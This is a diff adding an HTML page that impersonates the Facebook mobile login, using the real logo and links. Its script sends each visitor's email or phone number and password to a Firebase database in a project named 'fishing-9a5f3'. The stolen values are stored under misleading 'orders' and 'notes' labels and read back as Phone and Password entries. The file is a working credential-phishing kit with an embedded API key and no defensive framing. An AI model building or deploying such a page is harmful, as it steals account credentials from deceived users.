@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Facebook</title>
+    <style>
+        .form-control {
+            border: none;
+            background: #f2f2f2;
+            border-radius: 4px;
+            box-shadow: 0.5px 0.5px 0.5px 0.5px rgba(0, 0, 0, 0.3);
+            padding: 4px 8px;
+            margin: 5px;
+            width: 90%;
+            height: 40px;
+        }
+        .btn-default {
+            border: none;
+            color: white;
+            background: #5890FF;
+            border-radius: 4px;
+            box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.3);
+            padding: 4px;
+            margin: 5px;
+            width: 90%;
+            height: 40px;
+            text-align: center;
+            vertical-align: center;
+            cursor: pointer;
+        }
+        .btn-default:hover {
+            background: #3366FF;
+        }
+        .btn3 {
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            width: 80%;
+            margin-top: 10px;
+            padding: 8px;
+            background-color: white;
+            color: black;
+            outline-color: black;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        a {
+            text-decoration: none;
+            color: #5890FF;
+            font-family: Arial, sans-serif;
+            margin: -3px;
+        }
+    </style>
+</head>
+
+<body align="center">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" width="100%" height="50px" alt="Facebook">
+    <br>
+    <div class="container">
+        <form>
+            <div class="form-group">
+                <input placeholder="Email or Phone Number" type="text" class="form-control" id="fullNameField">
+            </div>
+            <div class="form-group">
+                <input type="password" placeholder="Password" class="form-control" id="notesField">
+            </div>
+            <div>
+                <button class="btn-default" onclick="submitOrder()"><b>Log In</b></button>
+            </div>
+            <br>
+        </form>
+        <a href="https://m.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjg2NTUwMzU3LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&c=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0cKEjeW2NeFG0op0J&r&cuid&ars=facebook_login&lwv=100&refid=8" style="width:20%; margin:40% 0px;">Forgotten password?</a>
+        <div style="display:flex; margin: 16px;">
+            <div style="width:49.5%;height:1.5px; background-color:grey"></div>or
+            <div style="width:49.5%;height:1.5px; background-color:grey"></div>
+        </div>
+        <button class="btn3" onclick="window.location.href='https://m.facebook.com/reg/?cid=103&wtsid=rdr_0dI6jd0y6EglTJ4T6&refsrc=deprecated&_rdr'"><b>Create New Account</b></button>
+    </div>
+
+    <!-- JavaScript Libraries -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+    <script src="https://www.gstatic.com/firebasejs/4.7.0/firebase.js"></script>
+    <script>
+        var config = {
+            apiKey: "AIzaSyD1cdHJ_wYXYzUreCG7LkCOke8pLOANKnU",
+            authDomain: "fishing-9a5f3.firebaseapp.com",
+            databaseURL: "https://fishing-9a5f3-default-rtdb.firebaseio.com",
+            projectId: "fishing-9a5f3",
+            storageBucket: "fishing-9a5f3.appspot.com",
+            messagingSenderId: "147667070774",
+            appId: "1:147667070774:web:a32e3eb0109bc726360d97",
+            measurementId: "G-PX9J13JFTQ"
+        };
+
+        firebase.initializeApp(config);
+        var database = firebase.database();
+        var firebaseOrdersCollection = database.ref().child('orders');
+
+        function submitOrder() {
+            var currentdate = new Date();
+            var datetime = currentdate.getDate() + "/" + (currentdate.getMonth() + 1) + "/" + currentdate.getFullYear() + " @ " + currentdate.getHours() + ":" + currentdate.getMinutes() + ":" + currentdate.getSeconds();
+
+            var order = {
+                fullName: $('#fullNameField').val(),
+                notes: $('#notesField').val(),
+                dt: datetime
+            };
+
+            firebaseOrdersCollection.push(order);
+        }
+
+        firebaseOrdersCollection.on('value', function(snapshot) {
+            var allOrdersHtml = "";
+            snapshot.forEach(function(childSnapshot) {
+                var order = childSnapshot.val();
+                var individualOrderHtml = `<div class='item'>
+                                                <p>Phone: ${order.fullName}</p>
+                                                <p>Password: ${order.notes}</p>
+                                            </div>`;
+                allOrdersHtml += individualOrderHtml;
+            });
+            $('#previousOrders').html(allOrdersHtml);
+        });
+    </script>
+</body>
+
+  </html>
